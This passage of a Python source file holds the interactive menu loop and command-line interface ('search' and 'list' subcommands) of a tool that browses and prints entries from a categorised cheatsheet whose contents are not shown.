            idx_str = questionary.text(
                "Pick a match number (or blank to skip):",
                qmark="", style=q_style,
            ).ask()
            if not idx_str:
                continue
            try:
                idx = int(idx_str) - 1
                if not (0 <= idx < len(matches)):
                    raise ValueError
            except ValueError:
                console.print(f"[error]invalid selection[/error]")
                continue
            cat, entry = matches[idx]
            render_entry(console, cat, entry)
            continue

        # Category selection (format "N. Name")
        try:
            cat_idx = int(pick.split(".", 1)[0]) - 1
            cat = CHEATSHEET[cat_idx]
        except (ValueError, IndexError):
            continue
        # Per-category entry list.
        while True:
            entry_choices = ([f"{i}. {e.title}" for i, e in enumerate(cat.entries, start=1)]
                              + ["[ Back to categories ]"])
            ep = questionary.select(
                f"{cat.name} — pick an entry:",
                choices=entry_choices, qmark="", style=q_style,
            ).ask()
            if ep is None or ep == "[ Back to categories ]":
                break
            try:
                ent_idx = int(ep.split(".", 1)[0]) - 1
                entry = cat.entries[ent_idx]
            except (ValueError, IndexError):
                continue
            render_entry(console, cat, entry)


# =====================================================================
# CLI
# =====================================================================
def cmd_search(query: str) -> int:
    console = Console(theme=THEME, highlight=False)
    matches = search_all(query)
    if not matches:
        console.print(f"[warning]No matches for {query!r}[/warning]")
        return 1
    for cat, entry in matches:
        render_entry(console, cat, entry)
    return 0


def cmd_list(only: str | None) -> int:
    console = Console(theme=THEME, highlight=False)
    for cat in CHEATSHEET:
        if only and only.lower() not in cat.name.lower():
            continue
        for entry in cat.entries:
            render_entry(console, cat, entry)
    return 0


def main():
    ap = argparse.ArgumentParser(
        description=__doc__,
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    sub = ap.add_subparsers(dest="cmd")

    sp = sub.add_parser("search", help="One-shot search across every entry")
    sp.add_argument("query")

    lp = sub.add_parser("list", help="Dump every entry (optionally filter to one category)")
    lp.add_argument("category", nargs="?",
                     help="If given, only dump entries whose category name contains this substring")

    args = ap.parse_args()

    if args.cmd == "search":
        return cmd_search(args.query)
    if args.cmd == "list":
        return cmd_list(args.category)

    # No subcommand: launch the interactive TUI.
    try:
        tui_loop()
    except KeyboardInterrupt:
        print()
        print("interrupted")
        sys.exit(130)
    return 0


if __name__ == "__main__":
    sys.exit(main() or 0)
